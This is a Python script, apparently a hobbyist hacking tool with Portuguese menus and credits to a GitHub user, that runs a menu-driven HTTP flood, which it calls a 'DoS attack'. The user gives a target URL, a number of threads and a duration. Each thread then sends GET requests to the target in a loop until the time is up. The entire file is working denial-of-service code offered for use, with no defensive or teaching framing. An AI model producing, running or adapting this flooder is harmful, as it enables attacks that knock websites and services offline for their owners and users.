import threading
import requests
import os
import time
from colorama import Fore, Style, init

# Inicializa o colorama
init(autoreset=True)

# Função para exibir o menu com cores RGB
def show_menu():
    os.system('clear')  # Limpa a tela no Linux ('cls' no Windows)
    
    # Título colorido
    print(Fore.RED + """
     __  __  ____  _   _ _   _  ____   ____ ___  ____  
    |  \/  |/ __ \| \ | | \ | |/ __ \ / ___/ _ \|  _ \ 
    | |\/| | |  | |  \| |  \| | |  | | |  | | | | |_) |
    | |  | | |  | | . ` | . ` | |  | | |__| |_| |  __/ 
    |_|  |_|\____/|_|\__|_|\__|\____/ \____\___/|_|    
    """)
    
    # Menu colorido
    print(Fore.CYAN + "========================================")
    print(Fore.GREEN + "             M4GNUS ATTACK MENU         ")
    print(Fore.CYAN + "========================================")
    print(Fore.MAGENTA + "[1] " + Fore.YELLOW + "Iniciar Ataque DoS")
    print(Fore.MAGENTA + "[2] " + Fore.YELLOW + "Créditos")
    print(Fore.MAGENTA + "[3] " + Fore.YELLOW + "Sair")
    print(Fore.CYAN + "========================================" + Style.RESET_ALL)

# Função para realizar a requisição HTTP
def attack(target_url, stop_event):
    while not stop_event.is_set():
        try:
            # Realiza a requisição GET
            response = requests.get(target_url)
            print(Fore.GREEN + f"Enviada requisição para {target_url} com status {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"Erro ao conectar: {e}")

# Função principal para o ataque
def start_attack():
    # Configurações básicas
    target_url = input(Fore.CYAN + "Digite a URL do alvo: ").strip()
    threads_count = int(input(Fore.CYAN + "Número de threads simultâneas: "))
    attack_duration = int(input(Fore.CYAN + "Tempo de ataque (em segundos): "))

    print(Fore.GREEN + f"\nIniciando ataque ao alvo {target_url} com {threads_count} threads por {attack_duration} segundos...\n")
    
    # Cria um evento para parar o ataque
    stop_event = threading.Event()

    # Inicia as threads para o ataque
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=attack, args=(target_url, stop_event))
        threads.append(thread)
        thread.start()

    # Aguarda o tempo definido para o ataque
    time.sleep(attack_duration)

    # Sinaliza para parar as threads
    stop_event.set()

    # Aguarda todas as threads terminarem
    for thread in threads:
        thread.join()

    print(Fore.YELLOW + "\nAtaque finalizado.\n")
    input(Fore.CYAN + "Pressione Enter para voltar ao menu...")  # Pausa antes de voltar ao menu

# Função para exibir os créditos
def show_credits():
    print(Fore.CYAN + "========================================")
    print(Fore.GREEN + "               CRÉDITOS                 ")
    print(Fore.CYAN + "========================================")
    print(Fore.YELLOW + "Desenvolvido por: " + Fore.RED + "Deiv")
    print(Fore.YELLOW + "GitHub: " + Fore.RED + "https://github.com/Defalt357")
    print(Fore.CYAN + "========================================\n")
    input(Fore.CYAN + "Pressione Enter para voltar ao menu...")

# Função principal para exibir o menu e lidar com a interação do usuário
def main():
    while True:
        show_menu()
        option = input(Fore.CYAN + "Escolha uma opção: ").strip()

        if option == '1':
            start_attack()
        elif option == '2':
            show_credits()
        elif option == '3':
            print(Fore.YELLOW + "Saindo...")
            break
        else:
            print(Fore.RED + "Opção inválida! Tente novamente.")

if __name__ == "__main__":
    main()
